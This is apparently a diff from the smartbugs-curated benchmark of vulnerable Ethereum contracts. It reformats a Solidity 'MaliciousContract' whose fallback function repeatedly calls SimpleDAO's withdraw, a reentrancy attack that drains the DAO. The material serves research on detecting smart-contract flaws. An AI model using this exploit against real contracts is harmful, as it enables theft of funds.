+++ smartbugs-curated/0.4.x/contracts/reentrancy/simple_dao_attack.sol
@@ -2,8 +2,6 @@ pragma solidity ^0.4.2;
 
 import "../dataset/reentrancy/simple_dao.sol";
 
-
-
 contract MaliciousContract {
     SimpleDAO public dao;
     address public owner;
@@ -13,16 +11,16 @@ contract MaliciousContract {
         owner = msg.sender;
     }
 
-    function attack(uint attack) public payable {
+    function attack(uint256 attack) public payable {
         require(attack > 0);
         dao.withdraw(attack);
     }
-    function deposit()  public payable{
+    function deposit() public payable {
         require(msg.value >= 1);
-        dao.donate.value(msg.value)(this);        
+        dao.donate.value(msg.value)(this);
     }
 
-    function () public payable {
+    function() public payable {
         if (address(dao).balance >= msg.value) {
             dao.withdraw(msg.value);
         }
